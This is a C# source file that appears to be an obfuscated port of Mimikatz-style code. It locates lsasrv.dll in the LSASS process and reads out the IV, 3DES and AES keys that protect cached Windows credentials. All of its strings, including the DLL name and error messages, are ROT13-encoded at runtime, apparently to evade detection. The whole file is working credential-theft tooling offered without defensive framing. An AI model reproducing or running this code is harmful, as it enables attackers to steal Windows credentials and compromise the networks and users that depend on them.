//start
using System.Text;
using System.Linq;
using System;
﻿//

using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ldump_rot13
{
    class Keys
    {
        private byte[] iv;
        private byte[] deskey;
        private byte[] aeskey;

        static long max_search_size = 580000;

        [StructLayout(LayoutKind.Sequential)]
        public struct KIWI_HARD_KEY
        {
            public int cbSecret;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 60)]
            public byte[] data; // etc...
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct KIWI_BCRYPT_KEY81
        {
            int size;
            int tag;  // 'MSSK'
            int type;
            int unk0;
            int unk1;
            int unk2;
            int unk3;
            int unk4;
            IntPtr unk5; // before, align in x64
            int unk6;
            int unk7;
            int unk8;
            int unk9;
            public KIWI_HARD_KEY hardkey;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct KIWI_BCRYPT_HANDLE_KEY
        {
            public int size;
            public int tag;  // 'UUUR'
            public IntPtr hAlgorithm; //PVOID
            public IntPtr key; //PKIWI_BCRYPT_KEY81
            public IntPtr unk0; //PVOID
        }

        public Keys(IntPtr hLsass, IntPtr lsasrvMem, OSVersionHelper oshelper)
        {
            if(FindKeys( hLsass,  lsasrvMem, oshelper) != 0)
            {
                Console.WriteLine(new string("Reebe ergevivat xrlf".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            }
        }

        public byte[] GetIV()
        {
            return iv;
        }

        public byte[] GetDESKey()
        {
            return deskey;
        }

        public byte[] GetAESKey()
        {
            return aeskey;
        }

        private int FindKeys(IntPtr hLsass, IntPtr lsasrvMem, OSVersionHelper oshelper)
        {

            long keySigOffset = 0;
            long ivOffset = 0;
            long desOffset = 0, aesOffset = 0;
            KIWI_BCRYPT_HANDLE_KEY h3DesKey;
            KIWI_BCRYPT_HANDLE_KEY hAesKey;
            KIWI_BCRYPT_KEY81 extracted3DesKey, extractedAesKey;
            IntPtr keyPointer = IntPtr.Zero;

            keySigOffset = (long)Utility.OffsetFromSign(new string("yfnfei.qyy".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()), oshelper.keyIVSig, max_search_size); 
            if (keySigOffset == 0)
            {
                Console.WriteLine(new string("[k] Reebe: Pbhyq abg svaq bssfrg gb NRF/3Qrf/VI xrlf\a".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
                return 1;
            }

            // Retrieve offset to InitializationVector address due to new string("yrn ert, [VavgvnyvmngvbaIrpgbe]".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()) instruction
            IntPtr tmp_p = IntPtr.Add(lsasrvMem, (int)keySigOffset + (int)oshelper.IV_OFFSET);
            byte[] ivOffsetBytes = Utility.ReadFromLsass(ref hLsass, tmp_p,  4);
            ivOffset = BitConverter.ToInt32(ivOffsetBytes, 0);

            tmp_p = IntPtr.Add(lsasrvMem, (int)keySigOffset + (int)oshelper.IV_OFFSET + 4 + (int)ivOffset);

            this.iv = Utility.ReadFromLsass(ref hLsass, tmp_p, 16);

            tmp_p = IntPtr.Add(lsasrvMem, (int)keySigOffset + (int)oshelper.DES_OFFSET);

            // Retrieve offset to h3DesKey address due to new string("yrn ert, [u3QrfXrl]".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()) instruction
            byte[] desOffsetBytes = Utility.ReadFromLsass(ref hLsass, tmp_p, 4);
            desOffset = BitConverter.ToInt32(desOffsetBytes, 0);

            tmp_p = IntPtr.Add(lsasrvMem, (int)keySigOffset + (int)oshelper.DES_OFFSET + 4 + (int)desOffset);
            
            byte[] keyPointerBytes = Utility.ReadFromLsass(ref hLsass, tmp_p, 8);
            long keyPointerInt = BitConverter.ToInt64(keyPointerBytes, 0);

            byte[] h3DesKeyBytes = Utility.ReadFromLsass(ref hLsass, new IntPtr(keyPointerInt), Marshal.SizeOf(typeof(KIWI_BCRYPT_HANDLE_KEY)));
            h3DesKey = Utility.ReadStruct<KIWI_BCRYPT_HANDLE_KEY>(h3DesKeyBytes);

            byte[] extracted3DesKeyByte = Utility.ReadFromLsass(ref hLsass, h3DesKey.key, Marshal.SizeOf(typeof(KIWI_BCRYPT_KEY81)));
            extracted3DesKey = Utility.ReadStruct<KIWI_BCRYPT_KEY81>(extracted3DesKeyByte);

            this.deskey = extracted3DesKey.hardkey.data;

            tmp_p = IntPtr.Add(lsasrvMem, (int)keySigOffset + (int)oshelper.AES_OFFSET);

            // Retrieve offset to hAesKey address due to new string("yrn ert, [uNrfXrl]".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()) instruction
            byte[] aesOffsetBytes = Utility.ReadFromLsass(ref hLsass, tmp_p, 4);
            aesOffset = BitConverter.ToUInt32(aesOffsetBytes, 0);

            tmp_p = IntPtr.Add(lsasrvMem, (int)keySigOffset + (int)oshelper.AES_OFFSET + 4 + (int)aesOffset);

            keyPointerBytes = Utility.ReadFromLsass(ref hLsass, tmp_p, 8);
            keyPointerInt = BitConverter.ToInt64(keyPointerBytes, 0);

            byte[] hAesKeyBytes = Utility.ReadFromLsass(ref hLsass, new IntPtr(keyPointerInt), Marshal.SizeOf(typeof(KIWI_BCRYPT_HANDLE_KEY)));
            hAesKey = Utility.ReadStruct<KIWI_BCRYPT_HANDLE_KEY>(hAesKeyBytes);

            byte[] extractedAesKeyBytes = Utility.ReadFromLsass(ref hLsass, hAesKey.key, Marshal.SizeOf(typeof(KIWI_BCRYPT_KEY81)));
            extractedAesKey = Utility.ReadStruct<KIWI_BCRYPT_KEY81>(extractedAesKeyBytes);

            this.aeskey = extractedAesKey.hardkey.data;

            return 0;
        }


    }
}
